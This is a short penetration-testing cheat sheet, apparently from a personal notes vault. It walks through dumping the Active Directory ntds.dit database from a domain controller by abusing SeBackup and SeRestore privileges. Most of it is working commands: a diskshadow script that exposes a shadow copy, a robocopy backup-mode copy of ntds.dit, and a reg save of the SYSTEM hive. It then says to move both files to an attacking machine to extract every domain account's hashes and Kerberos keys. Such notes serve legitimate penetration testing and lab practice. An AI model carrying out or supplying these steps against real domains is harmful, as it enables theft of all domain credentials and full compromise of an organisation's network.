# Backing Up & Dumping `ntds.dit`

> With the right level of permission, a domain account with access to a domain controller can dump the `ntds.dit` file and parse it for the domain accounts' hashes and Kerberos keys offline.

---

## Required Privileges

The user must have the `SeBackup` and the `SeRestore` privileges (default privileges of the `Backup Operators` AD group). Checkable via `whoami /priv` or `whoami /all`.

The user must also have access to the domain controller.

---

## Backing Up & Dumping  `ntds.dit`

Since `ntds.dit` is actively being used, it can't be copied. Use `diskshadow` to copy the entire drive to another drive, and then lift `ntds.dit` from that drive.

Write the commands to copy the drive into a text file on the target.

```bash
$ cat tgihf.dsh
set context persistent nowriters
add volume c: alias tgihf
create
expose %tgihf% z:
```

`c:` can be replaced with the letter of the drive you want to copy
- `tgihf` can be replaced with any alphabetic alias
- `z:` can be replaced with any other drive letter

If you created the command file on a Unix machine, be sure to use `unix2dos` on the file.

```bash
$ unix2dos tgihf.dsh
```

Execute the commands with `diskshadow`.

```powershell
$ diskshadow /s tgihf.dsh
```

Use `robocopy` to create a copy of `ntds.dit`.

```powershell
robocopy /b z:\windows\ntds . $OUTPUT_NTDS_FILE_PATH
```

To properly parse `ntds.dit`, you'll also need the `SYSTEM` registry file. Create a copy of it.

```powershell
reg save hklm\system $OUTPUT_SYSTEM_FILE_PATH
```

Transfer both files to the attacking machine.

[[secretsdump#Dump a local NTDS dit file requires SYSTEM registry hive file|Parse ntds.dit and dump the domain users' hashes and Kerberos keys.]]

---

## References

[Pentest Lab's Blog Post with Numerous Methods](https://pentestlab.blog/tag/diskshadow/)

[Hacking Articles's Walkthrough](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

[Hack the Box's Blackfield](https://app.hackthebox.com/machines/Blackfield)
